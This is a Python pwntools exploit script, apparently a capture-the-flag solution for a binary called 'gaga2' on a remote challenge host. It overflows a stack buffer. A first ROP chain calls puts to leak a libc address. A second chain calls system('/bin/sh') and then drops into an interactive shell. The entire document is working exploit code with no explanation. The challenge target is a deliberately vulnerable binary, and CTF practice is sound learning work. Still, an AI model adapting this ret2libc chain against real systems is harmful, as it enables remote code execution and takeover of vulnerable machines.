from pwn import *
exe = ELF('gaga2', checksec=False)
libc = exe.libc
rdi = 0x00000000004012b3
rsi = 0x00000000004012b1

payload = b"A" * 72
payload += p64(rdi) + p64(exe.got['puts'])
payload += p64(exe.sym['puts'])
payload += p64(exe.sym['main'])

# p = process(exe.path)
p = remote('challs.actf.co', 31302)
input()
p.recvuntil(b': ')
p.sendline(payload)
leak = u64(p.recv(6).ljust(8, b'\0'))
libc.address = leak - 0x84420
log.info("libc: " +  hex(libc.address))

payload = b"A" * 72
payload += p64(rdi) + p64(next(libc.search(b"/bin/sh")))
payload += p64(rsi) + p64(0) + p64(0)
payload += p64(libc.sym['system'])
p.recvuntil(b': ')
p.sendline(payload)
p.interactive()